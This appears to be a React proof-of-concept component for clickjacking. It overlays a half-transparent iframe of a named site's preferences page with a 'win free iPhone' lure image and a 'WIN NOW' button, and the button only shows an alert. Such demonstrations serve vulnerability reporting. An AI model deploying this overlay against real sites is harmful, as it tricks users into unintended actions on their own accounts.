import styled from "@emotion/styled";

const Image = styled.img`
    left: 39%;
    top: 35%;
`;

const IFrame = styled.iframe`
    opacity: 0.5;
    position: absolute;
`;

const Button = styled.button`
    position: absolute;
    top: 66%;
    left: 59%;
    font-weight: bold;
    pointer: cursor;
`;

export default function IFrameTest() {
    return (
        <>
            <p>Website is vulnerable to clickjacking!</p>
            <IFrame width="1000" height="1000" src="https://app.flockfreight.com/preferences"></IFrame>
            <Image src="http://1.bp.blogspot.com/-rJvfCoOO1Zo/UuhohFc2LjI/AAAAAAAAAkc/jnixX1qFaO8/s1600/win%2Bfree%2BiPhone%2B5%2Bgiveaway.gif" />
            <Button className="button" onClick={() => { alert("You just got clickjacked...")}}>WIN NOW</Button>
        </>

    )
}